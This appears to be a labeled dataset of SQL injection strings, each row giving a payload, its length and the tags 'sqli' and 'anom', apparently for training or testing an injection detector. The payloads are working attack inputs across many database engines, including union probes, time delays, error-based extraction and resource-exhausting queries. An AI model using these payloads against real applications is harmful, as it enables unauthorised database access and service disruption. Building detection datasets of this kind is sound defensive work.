"1%"";begin user_lock.sleep(5); end and ""%""=""",43,sqli,anom
"1'||(select 'mzsy' where 4940=4940 or elt(5873=5873,sleep(5))#",62,sqli,anom
"iif(2976=2976,1,1/0)",20,sqli,anom
"1' union all select null,null,null#",35,sqli,anom
"1',(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",169,sqli,anom
"1' union all select null,null,null,null,null--",46,sqli,anom
"1"");(select * from (select(sleep(5)))acdk)#",43,sqli,anom
"1))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",80,sqli,anom
"-1204')) union all select 3585,3585--",37,sqli,anom
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc",47,sqli,anom
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",65,sqli,anom
"1') where 5925=5925 union all select null,null,null,null,null,null,null#",72,sqli,anom
"-2248'+(select wuow where 4421=4421 union all select 4421,4421,4421,4421,4421,4421--",84,sqli,anom
1;waitfor delay '0:0:5',23,sqli,anom
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'lxqz'='lxqz",174,sqli,anom
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",69,sqli,anom
"1' or 8156=(select count(*) from generate_series(1,5000000))--",62,sqli,anom
"1')));select count(*) from generate_series(1,5000000) and ((('wvzw'='wvzw",73,sqli,anom
"1'+(select hspl where 4530=4530 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",130,sqli,anom
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",116,sqli,anom
"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",66,sqli,anom
1')));select pg_sleep(5)--,26,sqli,anom
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",82,sqli,anom
"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",60,sqli,anom
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",144,sqli,anom
"1%""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",80,sqli,anom
"-7776') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ihof'='ihof",220,sqli,anom
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",90,sqli,anom
1')) as pdcl where 6964=6964;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,112,sqli,anom
"-5317')) union all select 7673,7673,7673,7673,7673,7673#",56,sqli,anom
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",97,sqli,anom
"1'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli,anom
"1'))) union all select null,null,null,null,null,null,null,null,null,null#",73,sqli,anom
"1')) and elt(6847=5874,5874) and (('yspu'='yspu",47,sqli,anom
1%') and (7704=3494)*3494 and ('%'=',36,sqli,anom
-7663')) or 1558=1104 and (('wsrq'='wsrq,40,sqli,anom
"-9996' or make_set(1237=7111,7111)",34,sqli,anom
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""pnsz"" like ""pnsz",74,sqli,anom
"-6453"")) as hehs where 9363=9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",95,sqli,anom
"-5728) where 8663=8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",90,sqli,anom
1' and 7533=7533 and 'clqy' like 'clqy,38,sqli,anom
"1%') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('%'='",111,sqli,anom
"1))) union all select null,null,null,null,null,null,null,null,null#",67,sqli,anom
1' where 4473=4473 and (select * from (select(sleep(5)))gcrr)#,62,sqli,anom
"1%"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""%""=""",105,sqli,anom
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",63,sqli,anom
"1%"" and 3824=benchmark(5000000,md5(0x76555642)) and ""%""=""",57,sqli,anom
"-6118 union all select 5906,5906,5906,5906,5906#",48,sqli,anom
1) as pqle where 4039=4039 and 7533=7533--,42,sqli,anom
"-9265"") or 7834=1685",20,sqli,anom
"1') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,sqli,anom
"1)) as wajy where 8593=8593;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",95,sqli,anom
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",110,sqli,anom
"-2424) where 8132=8132 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",219,sqli,anom
"1)) and elt(9288=6067,6067) and ((1895=1895",43,sqli,anom
-3666') where 6386=6386 union all select 6386--,47,sqli,anom
1'||(select 'ylio' from dual where 3767=3767 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||',229,sqli,anom
"-7184) as fshx where 3408=3408 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",227,sqli,anom
"1"" and make_set(8403=8403,8899) and ""bbgg""=""bbgg",48,sqli,anom
"1%"") and elt(7436=9874,9874) and (""%""=""",39,sqli,anom
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr",85,sqli,anom
"-8178) union all select 4163,4163,4163,4163,4163,4163,4163--",60,sqli,anom
1) as jtfx where 8038=8038;select sleep(5)--,44,sqli,anom
1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc,55,sqli,anom
"-9840)) as thod where 4790=4790 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",228,sqli,anom
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))",60,sqli,anom
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",100,sqli,anom
"1 where 6044=6044 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",174,sqli,anom
"1'));select count(*) from generate_series(1,5000000) and (('wmoo' like 'wmoo",76,sqli,anom
1' where 7191=7191 rlike sleep(5)--,35,sqli,anom
"1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",199,sqli,anom
"-6642') where 3459=3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",86,sqli,anom
"-1859' union all select 1781,1781,1781,1781#",44,sqli,anom
"-7016%"")) union all select 8847,8847,8847--",43,sqli,anom
"(select (case when (1343=1343) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1343 end) from dual)",149,sqli,anom
1')));select case when 2948=7279 then 1 else null end--,55,sqli,anom
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",88,sqli,anom
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),205,sqli,anom
"1"") and 7533=7533 and (""jfsw"" like ""jfsw",40,sqli,anom
"1%"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",88,sqli,anom
1') and 5999=5879,17,sqli,anom
"-4413%')) union all select 1345,1345#",37,sqli,anom
"-6388'+(select 'jqld' where 8600=8600 union all select 8600,8600#",65,sqli,anom
"1%"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",115,sqli,anom
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('tpcm' like 'tpcm",178,sqli,anom
"-2453"") union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",76,sqli,anom
1');(select * from (select(sleep(5)))srmq) and ('kerg' like 'kerg,65,sqli,anom
-7103)) or 4610=1871 and ((1249=1249,36,sqli,anom
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",59,sqli,anom
"1' where 8451=8451 union all select null,null,null,null,null,null,null,null,null#",81,sqli,anom
-4410 where 5749=5749 or 1317=9823--,36,sqli,anom
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""yrgy"" like ""yrgy",89,sqli,anom
"-8129'))) union all select 4531,4531,4531#",42,sqli,anom
1')));select case when 3819=1887 then 1 else null end--,55,sqli,anom
"-1490'||(select 'uzbm' from dual where 3181=3181 union all select 3181,3181,3181,3181,3181--",92,sqli,anom
"1')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",90,sqli,anom
1')) and sleep(5) and (('jiio' like 'jiio,41,sqli,anom
-8513) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (5818=5818,219,sqli,anom
-7378' or 6872=6872 and 'bnmn' like 'bnmn,41,sqli,anom
"1%') and make_set(8403=8403,8899) and ('%'='",44,sqli,anom
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",203,sqli,anom
"1'+(select 'ixza' where 4374=4374 union all select null,null,null--",67,sqli,anom
"1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"-3347'+(select xuzs where 1076=1076 union all select 1076,1076,1076,1076,1076--",79,sqli,anom
1'+(select qsmo where 3172=3172;select (case when (4780=4432) then 4780 else 4780*(select 4780 from mysql.db) end)#,115,sqli,anom
"-5082)) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",75,sqli,anom
"1' in boolean mode) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)#",150,sqli,anom
"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""hybu"" like ""hybu",228,sqli,anom
"1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,sqli,anom
"1';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",87,sqli,anom
"-7518"" or elt(8413=3995,3995) and ""cpnf""=""cpnf",46,sqli,anom
"-9175')) union all select 6174,6174,6174,6174--",47,sqli,anom
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'lwir' like 'lwir",130,sqli,anom
1'+(select ijoh where 7145=7145 order by 1--,44,sqli,anom
1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,138,sqli,anom
"1)))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((3023=3023",207,sqli,anom
-9389') or 8859=3989--,22,sqli,anom
1'||(select 'bezt' where 7876=7876;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,118,sqli,anom
1)) or sleep(5)#,16,sqli,anom
1')) as rxxd where 5049=5049;select pg_sleep(5)--,49,sqli,anom
-6081 where 3681=3681 or 2603=3138--,36,sqli,anom
1 where 4785=4785 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,222,sqli,anom
"1"") where 1212=1212 and 8475=5864",33,sqli,anom
"1"" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--",60,sqli,anom
"1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (1624=1624",107,sqli,anom
1;select (case when (7254=5901) then 1 else 7254*(select 7254 from master..sysdatabases) end)--,95,sqli,anom
"-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#",84,sqli,anom
"-6928"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""mxhr"" like ""mxhr",218,sqli,anom
1')) and sleep(5) and (('tcwt'='tcwt,36,sqli,anom
1') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes,63,sqli,anom
"1) as nmlm where 9872=9872;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",87,sqli,anom
"1' where 6902=6902 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",216,sqli,anom
"1) and elt(7425=8842,8842) and (9194=9194",41,sqli,anom
"1%')) union all select null,null,null,null,null,null,null--",59,sqli,anom
1') rlike (select (case when (7447=3981) then 1 else 0x28 end)),63,sqli,anom
"1%"") rlike (select * from (select(sleep(5)))sgvo) and (""%""=""",60,sqli,anom
"-3865') union all select 4935,4935,4935,4935,4935--",51,sqli,anom
"1"")) waitfor delay '0:0:5' and ((""witb""=""witb",45,sqli,anom
"1%') union all select null,null,null#",37,sqli,anom
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",92,sqli,anom
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""ymss""=""ymss",111,sqli,anom
1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--,59,sqli,anom
"-5761"") or 3762=1274",20,sqli,anom
"1) where 9829=9829 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",156,sqli,anom
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",71,sqli,anom
1')) rlike (select * from (select(sleep(5)))sgvo) and (('hqcz'='hqcz,68,sqli,anom
"1""))) and 2006=2006",19,sqli,anom
"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#",102,sqli,anom
"1%"" union all select null#",26,sqli,anom
1) where 8320=8320 waitfor delay '0:0:5'--,42,sqli,anom
"1' in boolean mode) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",157,sqli,anom
-3520%' or 8571=8571--,22,sqli,anom
"1"")) as femc where 1313=1313 and 4595=4595#",43,sqli,anom
"-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj",53,sqli,anom
"1) where 8302=8302 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",94,sqli,anom
"1%')) union all select null,null,null,null,null,null,null,null--",64,sqli,anom
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""fkmh""=""fkmh",66,sqli,anom
"1');iif(1157=4542,1,1/0)",24,sqli,anom
"1"" order by 1#",14,sqli,anom
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ymnm'='ymnm,218,sqli,anom
"1"")) as rcse where 4559=4559 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",120,sqli,anom
"1"") as sstd where 9629=9629 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",120,sqli,anom
-1432 order by 1#,17,sqli,anom
-9721') or 9287=4362#,21,sqli,anom
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'bpbe' like 'bpbe",163,sqli,anom
1) where 2734=2734 waitfor delay '0:0:5'--,42,sqli,anom
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('narn'='narn",175,sqli,anom
"1'))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,sqli,anom
-2793') where 2621=2621 union all select 2621#,46,sqli,anom
"1)) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((3003=3003",169,sqli,anom
"1)) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((5200=5200",170,sqli,anom
-5585%'))) or 6990=7727,23,sqli,anom
"1"" and 6637=2321",16,sqli,anom
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",61,sqli,anom
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621",121,sqli,anom
"1)) as hqwy where 4433=4433 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",131,sqli,anom
1'||(select 'mlwj' from dual where 4247=4247 and 1702=8469)||',62,sqli,anom
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",85,sqli,anom
1');(select * from (select(sleep(5)))srmq) and ('pgth'='pgth,60,sqli,anom
"1 where 4331=4331 union all select null,null,null,null,null,null#",65,sqli,anom
"1"" where 1809=1809 and make_set(8403=8403,8899)--",49,sqli,anom
"1)) as npdl where 5796=5796 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,sqli,anom
"1'))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",101,sqli,anom
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",109,sqli,anom
1 where 5700=5700;select pg_sleep(5)--,38,sqli,anom
"-8777"") as lalf where 8606=8606 or elt(4397=5823,5823)--",56,sqli,anom
"1"") where 9962=9962 and 4595=4595#",34,sqli,anom
"1'+(select qdon where 9453=9453;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",133,sqli,anom
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('bzgs' like 'bzgs",181,sqli,anom
1)) as pynj where 7683=7683 waitfor delay '0:0:5'--,51,sqli,anom
"-9937')) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",71,sqli,anom
"1"")) as itxo where 7916=7916;select count(*) from generate_series(1,5000000)--",78,sqli,anom
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",161,sqli,anom
"1'+(select iaeu where 5509=5509 or 8514=benchmark(5000000,md5(0x544d5a4c))#",75,sqli,anom
"-6084')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('dfcp'='dfcp",222,sqli,anom
1')) or (select * from (select(sleep(5)))ydpu) and (('yqbo'='yqbo,65,sqli,anom
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)-- yekf",114,sqli,anom
"-4166%"") union all select 5190--",32,sqli,anom
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz",162,sqli,anom
"-4072%""))) or 3999=1979",23,sqli,anom
"-1763%"" or (8459=8459)*4906 and ""%""=""",37,sqli,anom
"1') as siyk where 1514=1514 union all select null,null,null,null,null,null#",75,sqli,anom
"1%"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""%""=""",85,sqli,anom
"1',row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",200,sqli,anom
1'||(select 'owzs' where 1475=1475 union all select null--,58,sqli,anom
"1'||(select 'akye' where 9242=9242 union all select null,null,null,null,null,null#",82,sqli,anom
"1) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",78,sqli,anom
"1"") where 3321=3321;begin dbms_lock.sleep(5); end--",51,sqli,anom
"-6996%"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli,anom
1))) and 6969=(select 6969 from pg_sleep(5)) and (((5333=5333,61,sqli,anom
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),189,sqli,anom
"1"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""diiv""=""diiv",96,sqli,anom
"1"")) as xhat where 6674=6674 union all select null,null,null#",61,sqli,anom
"1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",133,sqli,anom
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",61,sqli,anom
"1%') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli,anom
"1' where 8430=8430 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,sqli,anom
"1' where 2774=2774 union all select null,null,null,null,null#",61,sqli,anom
"1%') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('%'='",119,sqli,anom
"1 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",109,sqli,anom
"1')) as bsvk where 5985=5985 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",120,sqli,anom
"-9837"" where 7201=7201 union all select 7201,7201,7201--",56,sqli,anom
"1'||(select 'scqw' where 3337=3337 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",110,sqli,anom
"1%"");select sleep(5) and (""%""=""",31,sqli,anom
1' and 7528=2894 and 'qoyw'='qoyw,33,sqli,anom
"1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",150,sqli,anom
"-6890""))) union all select 1115#",32,sqli,anom
1));waitfor delay '0:0:5'--,27,sqli,anom
"-7111 union all select 2409,2409,2409,2409,2409,2409#",53,sqli,anom
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""soyg""=""soyg",109,sqli,anom
"1') as pghp where 9086=9086;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",112,sqli,anom
1') where 2330=2330 and (select * from (select(sleep(5)))fzno)--,64,sqli,anom
"1'+(select acax where 4169=4169 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",130,sqli,anom
1)) and 2006=2006,17,sqli,anom
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'gajm'='gajm",134,sqli,anom
1' where 6116=6116;select (case when (7033=1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#,127,sqli,anom
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",93,sqli,anom
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#",90,sqli,anom
"1')) as jntr where 5051=5051 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",201,sqli,anom
"1) where 1193=1193 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",110,sqli,anom
"1"")) as xwrq where 4161=4161;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",120,sqli,anom
"1%"") and elt(4249=4249,7259) and (""%""=""",39,sqli,anom
"1') and elt(3114=3114,sleep(5))#",32,sqli,anom
1%') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('%'=',75,sqli,anom
"1"") as fgne where 7207=7207;select pg_sleep(5)--",48,sqli,anom
1' and 6969=(select 6969 from pg_sleep(5)) and 'dgvg'='dgvg,59,sqli,anom
"1) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (8450=8450",173,sqli,anom
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""okpa""=""okpa",109,sqli,anom
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fjwv"" like ""fjwv",211,sqli,anom
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""ctrr""=""ctrr",79,sqli,anom
1') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd,81,sqli,anom
"1"")) as ikuz where 7385=7385;select sleep(5)#",45,sqli,anom
"1' in boolean mode);select benchmark(5000000,md5(0x4c4d6142))#",62,sqli,anom
"1'+(select 'rpbx' where 6748=6748 and elt(4249=4249,7259))+'",60,sqli,anom
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('jwbt'='jwbt",127,sqli,anom
"1'+(select qjng where 1897=1897 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",140,sqli,anom
"1 where 2267=2267 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",94,sqli,anom
"1%"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""%""=""",101,sqli,anom
"1"";iif(5257=5257,1,1/0)",23,sqli,anom
1'||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||',59,sqli,anom
"-5109))) or make_set(6627=7331,7331) and (((9466=9466",53,sqli,anom
"1))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((7589=7589",176,sqli,anom
"-9514)) as xdkw where 4975=4975 union all select 4975,4975,4975,4975#",69,sqli,anom
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""jgcv""=""jgcv",222,sqli,anom
"1'+(select dagm where 5461=5461 or 8466=benchmark(5000000,md5(0x694a4745)))+'",77,sqli,anom
1')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)#,89,sqli,anom
1%' rlike (select (case when (3596=4245) then 1 else 0x28 end)) and '%'=',73,sqli,anom
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",216,sqli,anom
"-2086%'))) or make_set(9354=9354,7185) and ((('%'='",51,sqli,anom
1));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,101,sqli,anom
"-5700 where 4238=4238 union all select 4238,4238,4238#",54,sqli,anom
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('vjhw' like 'vjhw",130,sqli,anom
1')) and 3526=1354,18,sqli,anom
"1"") where 3445=3445 and elt(1212=1254,1254)--",45,sqli,anom
